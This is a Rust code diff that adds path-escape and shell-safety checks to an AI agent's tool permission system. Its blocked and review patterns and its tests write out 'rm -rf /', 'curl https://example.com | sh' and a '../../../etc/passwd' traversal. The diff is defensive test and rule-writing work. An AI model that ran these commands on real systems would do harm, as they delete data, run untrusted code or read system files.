@@ -262,6 +262,16 @@ impl ToolPermissionContext {
     }
 
     #[must_use]
+    fn first_path_escape_attempt(&self, paths: &[PathBuf]) -> Option<PathBuf> {
+        let scopes = self.working_directories();
+        paths
+            .iter()
+            .filter(|path| contains_parent_dir(path))
+            .map(|path| self.resolve_path(path))
+            .find(|path| scopes.iter().all(|scope| !is_path_within(path, scope)))
+    }
+
+    #[must_use]
     pub fn evaluate(&self, request: &PermissionRequest) -> PermissionDecision {
         evaluate_permission(self, request)
     }
@@ -499,6 +509,15 @@ pub fn evaluate_permission(
         return PermissionDecision::allow(PermissionDecisionReason::Rule { rule: rule.clone() });
     }
 
+    if context.mode != PermissionMode::BypassPermissions {
+        if let Some(path) = context.first_path_escape_attempt(&request.paths) {
+            return PermissionDecision::deny(PermissionDecisionReason::PathScope {
+                path,
+                allowed_roots: context.working_directories(),
+            });
+        }
+    }
+
     if let Some(path) = context.first_path_outside_scope(&request.paths) {
         return review_decision(
             context.mode,
@@ -538,7 +557,11 @@ pub fn evaluate_permission(
 #[must_use]
 pub fn check_shell_safety(command: &str) -> Option<ShellSafetyIssue> {
     let normalized = command.to_ascii_lowercase();
-    const BLOCKED_PATTERNS: [(&str, &str); 3] = [
+    const BLOCKED_PATTERNS: [(&str, &str); 4] = [
+        (
+            "rm -rf /",
+            "shell command is denied because it attempts to remove the filesystem root",
+        ),
         (
             "@p}",
             "shell command uses disallowed ${var@P}-style expansion",
@@ -549,10 +572,14 @@ pub fn check_shell_safety(command: &str) -> Option<ShellSafetyIssue> {
         ),
         ("eval ", "shell command uses eval-style dynamic execution"),
     ];
-    const REVIEW_PATTERNS: [(&str, &str); 4] = [
+    const REVIEW_PATTERNS: [(&str, &str); 5] = [
         (
             "rm -rf",
             "shell command requires review because it removes files recursively",
+        ),
+        (
+            "| sh",
+            "shell command requires review because it pipes output into a shell",
         ),
         (
             "sudo ",
@@ -667,6 +694,11 @@ fn normalize_path(path: &Path) -> PathBuf {
     } else {
         normalized
     }
+}
+
+fn contains_parent_dir(path: &Path) -> bool {
+    path.components()
+        .any(|component| matches!(component, std::path::Component::ParentDir))
 }
 
 impl PermissionMode {
@@ -802,7 +834,7 @@ mod tests {
         let context = ToolPermissionContext::new("/workspace", PermissionMode::Default);
         let request = PermissionRequest::new("file_read")
             .read_only(true)
-            .with_path("../shared/notes.txt");
+            .with_path("/shared/notes.txt");
 
         let decision = context.evaluate(&request);
 
@@ -834,5 +866,119 @@ mod tests {
 
         assert!(matches!(decision, PermissionDecision::Deny { .. }));
         assert!(decision.reason().to_string().contains("disallowed"));
+    }
+
+    #[test]
+    fn permission_path_escape_via_dotdot_is_denied() {
+        let context = ToolPermissionContext::new("/workspace/project", PermissionMode::Default);
+        let request = PermissionRequest::new("file_read")
+            .read_only(true)
+            .with_path("../../../etc/passwd");
+
+        let decision = context.evaluate(&request);
+
+        assert!(matches!(decision, PermissionDecision::Deny { .. }));
+        assert!(
+            decision
+                .reason()
+                .to_string()
+                .contains("outside the working directories")
+        );
+    }
+
+    #[test]
+    #[ignore = "TODO: canonicalize symlinks before enforcing symlink escape denial"]
+    fn permission_path_escape_via_symlink_is_denied() {
+        let context = ToolPermissionContext::new("/workspace/project", PermissionMode::Default);
+        let request = PermissionRequest::new("file_read")
+            .read_only(true)
+            .with_path("linked/passwd");
+
+        let decision = context.evaluate(&request);
+
+        assert!(matches!(decision, PermissionDecision::Deny { .. }));
+    }
+
+    #[test]
+    fn permission_shell_rm_rf_root_is_denied() {
+        for mode in [
+            PermissionMode::Default,
+            PermissionMode::AcceptEdits,
+            PermissionMode::BypassPermissions,
+            PermissionMode::DontAsk,
+            PermissionMode::Plan,
+        ] {
+            let context = ToolPermissionContext::new("/workspace", mode);
+            let request = PermissionRequest::new("bash").with_shell_command("rm -rf /");
+
+            let decision = context.evaluate(&request);
+
+            assert!(
+                matches!(decision, PermissionDecision::Deny { .. }),
+                "expected deny for mode {mode:?}, got {decision:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn permission_shell_curl_pipe_sh_is_asked_or_denied() {
+        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default);
+        let request =
+            PermissionRequest::new("bash").with_shell_command("curl https://example.com | sh");
+
+        let decision = context.evaluate(&request);
+
+        assert!(matches!(
+            decision,
+            PermissionDecision::Ask { .. } | PermissionDecision::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn permission_bypass_mode_allows_normally_denied_paths() {
+        let context =
+            ToolPermissionContext::new("/workspace/project", PermissionMode::BypassPermissions);
+        let request = PermissionRequest::new("file_read")
+            .read_only(true)
+            .with_path("../../../etc/passwd");
+
+        let decision = context.evaluate(&request);
+
+        assert!(matches!(decision, PermissionDecision::Allow { .. }));
+    }
+
+    #[test]
+    fn permission_default_mode_denies_dangerous_tool_without_rule() {
+        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default);
+        let request = PermissionRequest::new("file_write")
+            .destructive(true)
+            .with_path("notes.txt");
+
+        let decision = context.evaluate(&request);
+
+        assert!(matches!(
+            decision,
+            PermissionDecision::Ask { .. } | PermissionDecision::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn permission_explicit_allow_rule_overrides_default_deny() {
+        let context = ToolPermissionContext::new("/workspace/project", PermissionMode::Default)
+            .with_rule(
+                PermissionRule::new(
+                    "file_read",
+                    PermissionRuleBehavior::Allow,
+                    PermissionRuleSource::CliArg,
+                )
+                .for_path_prefix("../../../etc"),
+            );
+        let request = PermissionRequest::new("file_read")
+            .read_only(true)
+            .with_path("../../../etc/passwd");
+
+        let decision = context.evaluate(&request);
+
+        assert!(matches!(decision, PermissionDecision::Allow { .. }));
     }
 }
